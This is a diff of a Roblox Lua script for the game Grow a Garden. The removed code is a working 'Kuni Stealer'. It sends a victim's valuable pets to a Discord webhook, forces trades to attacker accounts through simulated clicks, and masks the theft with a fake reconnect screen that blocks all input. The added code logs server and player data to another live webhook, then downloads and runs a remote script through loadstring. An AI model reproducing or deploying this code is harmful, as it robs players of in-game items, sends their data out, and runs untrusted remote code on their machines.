@@ -1,385 +1,49 @@
-repeat task.wait() until game:IsLoaded()
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
-local Camera = workspace.CurrentCamera
-local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1406162216247623792/DdZdihmGWBrJQxh5l97gKP3p_21wCtHL5kDfwPoKPs7qt5Kss3uJByOtQdmsd_GPRROH"
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
-local dataModule = require(ReplicatedStorage.Modules.DataService)
-
--- Whitelisted usernames that when join, you teleport to them invisibly
-local USERNAMES = {
-    "HelloWorld_Z99",
-    "Kuni_Loot",
-    "Kuni_Loot1",
-    "Kuni_Loot02",
-    "Kuni_Loot3",
-    "Elaine_Pets",
-    "Elaine_Pets1",
-    "Elaine_Pets2",
-    "Elaine_Pets3",
-    "Elaine_Pets4",
-    "Elaine_Pets5",
-    "Elaine_Pets6",
-    "Elaine_Pets7",
-    "Elaine_Pets8",
-    "Elaine_Pets9",
-    "Elaine_Pets10",
-    "Elaine_Pets11",
-    "Elaine_Pets12",
-    "Elaine_Pets13",
-    "Elaine_Pets14",
-    "Elaine_Pets15",
-    "Elaine_Pets16",
-    "Elaine_Pets17",
-    "Elaine_Pets18",
-    "Elaine_Pets19",
-    "Elaine_Pets20",
-    "BEESUYAH"
-}
-   
-
--- PET whitelist map: pet name => UUID
-local PET_WHITELIST = {
-    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
-    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
-    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
-    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
-    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
-    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
-    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
-    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
-    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
-    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
-}
-
-local victimPetTable = {}
-
--- Check if pet name is whitelisted
-local function checkPetsWhitelist(petName)
-    return PET_WHITELIST[petName] ~= nil
-end
-
--- Get pet object by UUID from Backpack or Character
-local function getPetObject(petUUID)
-    for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
-        if obj:GetAttribute("PET_UUID") == petUUID then
-            return obj
-        end
-    end
-    if LocalPlayer.Character then
-        for _, obj in pairs(LocalPlayer.Character:GetChildren()) do
-            if obj:GetAttribute("PET_UUID") == petUUID then
-                return obj
-            end
-        end
-    end
-    return nil
-end
-
--- Equip pet tool
-local function equipPet(pet)
-    if pet:GetAttribute("d") then
-        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
-    end
-    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        LocalPlayer.Character.Humanoid:EquipTool(pet)
-    end
-end
-
--- Teleport to target player
-local function teleportTarget(targetName)
-    local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-    end
-end
-
--- Bypass click to trigger stealing prompt
-local function deltaBypass()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2,
-        workspace.Camera.ViewportSize.Y / 2,
-        0, true, nil, false
-    )
-    task.wait()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2,
-        workspace.Camera.ViewportSize.Y / 2,
-        0, false, nil, false
-    )
-end
-
--- Start stealing by triggering the prompt on victim's character head
-local function startSteal(triggerName)
-    local targetPlayer = Players:FindFirstChild(triggerName)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
-        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
-        if prompt then
-            prompt.HoldDuration = 0
-            deltaBypass()
-        end
-    end
-end
-
--- Send Discord webhook embed
-local function createDiscordEmbed(petList, totalValue, fileUrl)
-    local embed = {
-        title = " ⚠️GROW A GARDEN HITS - KUNI STEALER⚠️",
-        color = 65280,
-        fields = {
-            {
-                name = "**Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    LocalPlayer.Name, 
-                    table.concat(USERNAMES, " "), 
-                    LocalPlayer.Name, -- or identifyexecutor() if you have it
-                    LocalPlayer.AccountAge
-                ),
-                inline = false
-            },
-          
-            {
-                name = "🎒**Backpack**",
-                value = string.format("```%s```", petList),
-                inline = false
-            },
-            {
-                name = "🥀**Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
-                inline = false
+local function sendJobLog()
+    local payload = {
+        username = "Roblox Job Logger",
+        embeds = {{
+            title = "Server Started",
+            color = 65280,
+            fields = {
+                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+                { name = "JobId", value = tostring(game.JobId), inline = true },
+                { name = "Players", value = tostring(#game.Players:GetPlayers()), inline = true },
+                { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false }
             }
-        },
-        footer = {
-            text = string.format("%s | %s", game.PlaceId, game.JobId)
-        }
+        }}
     }
-
-    local data = {
-        content = string.format(
-            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId,
-            game.JobId
-        ),
-        username = LocalPlayer.Name,
-        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
-        embeds = {embed}
-    }
-
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = { ["Content-Type"] = "application/json" }
-
-    local request = http_request or request or HttpPost or syn.request
-    local response = request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonData
-    })
-
-    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
-        warn("Error sending to Discord:", response.StatusCode, response.Body)
-    end
-end
-
--- Check pets inventory and equip + steal from victim
-local function checkPetsInventory(targetName)
-    for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(petData.PetType) then
-            continue
-        end
-        local petObject = getPetObject(petUUID)
-        if petObject then
-            equipPet(petObject)
-            task.wait(0.2)
-            startSteal(targetName)
-        end
-    end
-end
-
--- Wait for whitelisted players to join, then teleport + act on them
-local function waitForJoin()
-    for _, player in pairs(Players:GetPlayers()) do
-        if table.find(USERNAMES, player.Name) then
-            return true, player.Name
-        end
-    end
-    return false, nil
-end
-
--- Make yourself invisible only to victims (players NOT in USERNAMES)
-local function makeInvisibleToVictims()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
-            if player.Character then
-                for _, part in pairs(player.Character:GetDescendants()) do
-                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
-                        part.Transparency = 1
-                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
-                        part.Enabled = false
-                    end
-                end
-            end
-        end
-    end
-end
-
--- Add a heavy blur to local player's screen
-local function addBlurEffect()
-    local blur = Instance.new("BlurEffect")
-    blur.Size = 50
-    blur.Parent = Lighting
-    return blur
-end
-
--- Main loop to continuously act when victim detected
-local function idlingTarget()
-    task.spawn(function()
-        while task.wait(0.2) do
-            local found, targetName = waitForJoin()
-            if found then
-                teleportTarget(targetName)
-                checkPetsInventory(targetName)
-                makeInvisibleToVictims()
-            end
-        end
+    local json = HttpService:JSONEncode(payload)
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
     end)
 end
 
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local ContextActionService = game:GetService("ContextActionService")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
+sendJobLog()
 
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- Disable lahat ng CoreGui (player list, chat, leave button, etc)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-
--- Delete lahat ng existing ScreenGui para mawala lahat ng UI
-for _, gui in pairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") then
-        gui:Destroy()
-    end
-end
-
--- Gumawa ng fullscreen overlay na may message
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ReconnectOverlay"
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
-screenGui.Enabled = false -- start disabled for fade-in
-
-local frame = Instance.new("Frame")
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Pure black
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundTransparency = 1 -- start transparent for fade-in
-frame.Parent = screenGui
-
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(0.8, 0, 0.6, 0)
-textLabel.Position = UDim2.new(0.1, 0, 0.2, 0)
-textLabel.BackgroundTransparency = 1
-textLabel.Text = [[
-Connection Interrupted
-
-Reconnecting to the server.
-Please wait while we restore your session.
-Your progress will be saved.
-
-Thank you for your patience and understanding.
-]]
-textLabel.TextColor3 = Color3.new(1, 1, 1)
-textLabel.Font = Enum.Font.SourceSansBold
-textLabel.TextScaled = true
-textLabel.TextWrapped = true
-textLabel.TextStrokeTransparency = 0.7
-textLabel.Parent = frame
-
-local byLabel = Instance.new("TextLabel")
-byLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
-byLabel.Position = UDim2.new(0.35, 0, 0.82, 0)
-byLabel.BackgroundTransparency = 1
-byLabel.Text = "By Jandel"
-byLabel.TextColor3 = Color3.new(1, 1, 1)
-byLabel.Font = Enum.Font.SourceSansItalic
-byLabel.TextScaled = true
-byLabel.TextWrapped = true
-byLabel.TextStrokeTransparency = 0.7
-byLabel.Parent = frame
-
--- Disable mouse cursor
-UserInputService.MouseIconEnabled = false
-
--- Block lahat ng input keys at mouse/touch para di makagalaw
-ContextActionService:BindAction("BlockInput", function()
-    return Enum.ContextActionResult.Sink
-end, false,
-    Enum.KeyCode.Escape,
-    Enum.KeyCode.Backspace,
-    Enum.KeyCode.Tab,
-    Enum.KeyCode.LeftAlt,
-    Enum.KeyCode.RightAlt,
-    Enum.KeyCode.LeftControl,
-    Enum.KeyCode.RightControl,
-    Enum.KeyCode.LeftShift,
-    Enum.KeyCode.RightShift,
-    Enum.KeyCode.F4,
-    Enum.KeyCode.Delete,
-    Enum.KeyCode.Home,
-    Enum.KeyCode.End,
-    Enum.KeyCode.PageUp,
-    Enum.KeyCode.PageDown,
-    Enum.KeyCode.Insert,
-    Enum.KeyCode.Space,
-    Enum.UserInputType.MouseButton1,
-    Enum.UserInputType.MouseButton2,
-    Enum.UserInputType.Touch,
-    Enum.UserInputType.Keyboard
-)
-
--- Show overlay with fade-in effect
-screenGui.Enabled = true
-local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local tween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 0})
-tween:Play()
-
--- Text pulse animation (grow/shrink scale)
-local pulseSpeed = 3
-local pulseMagnitude = 0.05
-RunService.RenderStepped:Connect(function(time)
-    local scaleFactor = 1 + math.sin(time * pulseSpeed) * pulseMagnitude
-    textLabel.TextScaled = false
-    textLabel.TextSize = 40 * scaleFactor
-    byLabel.TextScaled = false
-    byLabel.TextSize = 24 * scaleFactor
+game.Players.PlayerAdded:Connect(function(player)
+    local payload = {
+        username = "Roblox Job Logger",
+        embeds = {{
+            title = "Player Joined",
+            color = 3447003,
+            fields = {
+                { name = "Player", value = player.Name .. " (" .. player.UserId .. ")", inline = false },
+                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+                { name = "JobId", value = tostring(game.JobId), inline = true },
+                { name = "Current Players", value = tostring(#game.Players:GetPlayers()), inline = false }
+            }
+        }}
+    }
+    local json = HttpService:JSONEncode(payload)
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
+    end)
 end)
--- Build pet list for webhook and send it once
-for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-    if checkPetsWhitelist(petData.PetType) then
-        table.insert(victimPetTable, petData.PetType)
-    end
-end
 
-task.spawn(function()
-    while task.wait(0.5) do
-        if #victimPetTable > 0 then
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
-            break
-        end
-    end
+-- Run external script
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/growagarden/refs/heads/main/script.lua"))()
 end)
